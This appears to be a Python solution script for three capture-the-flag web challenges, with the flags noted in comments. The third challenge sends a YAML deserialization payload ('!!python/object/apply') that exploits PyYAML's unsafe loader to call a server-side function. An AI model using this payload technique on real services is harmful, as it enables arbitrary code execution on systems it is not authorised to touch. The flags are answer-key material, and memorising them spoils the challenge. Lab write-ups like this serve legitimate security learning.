import requests

# Post1
r = requests.post("https://infreezy.pythonanywhere.com/post") # sending a post request to this link
print(r.text)
# inf{there's_more_than_one_http_request_method}

# Post2
r = requests.post("https://infreezy.pythonanywhere.com/post2", data={"username":"admin"}) # Same idea, just sending data with the request
print(r.text)
# inf{there's_more_than_one_way_to_post}

# Post3
# You can see in the script that the website uses yaml.load(text, Loader=yaml.Loader) which is vulnerable to RCE!
"""A vulnerability was discovered in the PyYAML library in versions before 5.3.1, 
where it is susceptible to arbitrary code execution when it processes untrusted YAML files through the full_load method or with the FullLoader loader. 
Applications that use the library to process untrusted input may be vulnerable to this flaw. 
An attacker could use this flaw to execute arbitrary code on the system by abusing the python/object/new constructor."""

# You've probably also noticed that it's impossible to enter the secret text since it's longer than 20 characters!
# And that there's a module called flag containing get_flag()
# All you have to do is to call that function in yaml

r = requests.post("http://127.0.0.1:5000/post3", data={"text":"!!python/object/apply:flag.get_flag []"})
print(r.text)
# inf{D3s3r14l1Z4t10N}
